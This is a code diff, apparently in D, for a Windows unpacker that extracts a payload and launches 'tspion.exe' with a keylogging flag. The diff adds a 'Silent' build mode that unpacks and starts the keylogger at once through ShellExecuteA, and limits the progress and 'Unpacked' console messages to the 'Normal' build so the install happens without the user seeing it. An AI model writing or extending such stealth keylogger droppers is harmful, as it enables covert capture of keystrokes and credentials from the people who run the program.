@@ -18,7 +18,20 @@ import std.string;
 
 enum int BLOCKSIZE = 1024;
 
+extern (Windows)
+{
+    HINSTANCE ShellExecuteA(HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, INT);
+}
+
 void main() {
+    version(Silent)
+    {
+        pragma(msg, "Silent Mode is On");
+        unpack();
+        launch(true);
+        return;
+    }
+    
 	HANDLE hc = GetStdHandle(STD_OUTPUT_HANDLE);
 	SetConsoleTextAttribute(hc, 0x0a);
 	
@@ -64,17 +77,19 @@ void write_wp(immutable(char[]) data, string fname) {
 			write("["~"*".repeat(cprog)~" ".repeat(50-cprog)~"]");
 			writef("%7.2f", 100.0*i/lendata);
 			write("%");
-			stdout.flush();
+			version(Normal) stdout.flush();
 			progress = cprog;
 		}
 		file.rawWrite(data[i..i+BLOCKSIZE]);
 	}
     file.rawWrite(data[i..$]);
-    
-	write("\b".repeat(60));
-	write(" ".repeat(60));
-	write("\b".repeat(60));
-	writefln("Unpacked %s.", fname);
+    version(Normal)
+    {
+        write("\b".repeat(60));
+        write(" ".repeat(60));
+        write("\b".repeat(60));
+        writefln("Unpacked %s.", fname);
+    }
     file.close();
 }
 
@@ -84,8 +99,16 @@ void launch(bool beginkeylog) {
 	auto ns = GetModuleFileNameA(cast(HMODULE)null, &modfname[0], 256);
 	string modname = std.conv.to!string(modfname[0 .. ns]).strip;
 	
-	if(beginkeylog)
-		std.process.system(`start tspion.exe sd "`~modname~`"`);
-	else
-		std.process.system(`start tspion.exe sdonly "`~modname~`"`);
+    version(Normal)
+    {
+        if(beginkeylog)
+            std.process.system(`start tspion.exe sd "`~modname~`"`);
+        else
+            std.process.system(`start tspion.exe sdonly "`~modname~`"`);
+    }
+    
+    version(Silent)
+    {
+        ShellExecuteA(null, "open", "tspion.exe", toStringz("sd \""~modname~"\""), null, SW_SHOWDEFAULT);
+    }
 }
